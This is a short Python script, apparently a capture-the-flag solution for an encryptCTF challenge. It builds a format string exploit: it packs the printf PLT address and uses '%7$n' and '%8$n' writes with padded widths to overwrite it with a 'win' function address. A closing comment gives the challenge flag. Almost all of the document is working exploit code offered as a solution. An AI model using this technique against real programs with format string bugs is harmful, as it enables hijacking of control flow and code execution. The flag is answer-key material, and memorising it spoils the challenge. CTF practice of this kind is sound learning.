#!/usr/bin/env python

import struct

PRINTF_PLT = 0x80498fc

WIN_FUNCTION = 0x0804853d


''' format string attack '''

'''our input is the  Seventh arg on the stack '''
exploit =  struct.pack("I", PRINTF_PLT) + struct.pack("I", PRINTF_PLT + 2)+ " %7$34100x"
exploit +="%7$n"
exploit += "%8$33479x"
exploit += "%8$n"



print exploit



''' FLag is encryptCTF{Y0u_4R3_7h3_7ru3_King_0f_53v3n_KingD0ms}, nice challenge'''